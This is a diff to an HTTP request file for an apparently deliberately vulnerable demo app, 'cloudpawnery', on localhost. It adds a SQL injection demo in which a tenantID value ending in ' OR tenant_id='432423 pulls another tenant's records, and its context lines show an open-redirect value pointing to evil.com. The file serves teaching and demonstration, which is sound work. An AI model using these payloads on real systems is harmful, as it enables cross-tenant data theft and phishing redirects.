@@ -78,4 +78,29 @@ GET http://localhost:6000/cloudpawnery/user
     ?userId=1
     &redirectPage=http://evil.com
 
+## Vulnerability demo: SQL Injection
 
+
+### ✅ All Systems Go
+
+GET http://localhost:6000/cloudpawnery/image
+    ?tenantID=3971533981712
+Content-Type: application/json
+
+### ❌ Careful Now: SQL Injection
+
+#### We first create another entry belonging to a different tenant id:
+
+POST http://localhost:6000/cloudpawnery/image
+    ?tenantID=432423
+    &fileID=fid-1f8b6b1e-1f8b-4b1e-8b6b-1e4b1e8b6b1e
+    &fileSize=180
+Content-Type: application/json
+
+{}
+
+#### Now we can show how SQL injection works by requesting multiple records
+
+GET http://localhost:6000/cloudpawnery/image
+    ?tenantID=3971533981712' OR tenant_id='432423
+Content-Type: application/json
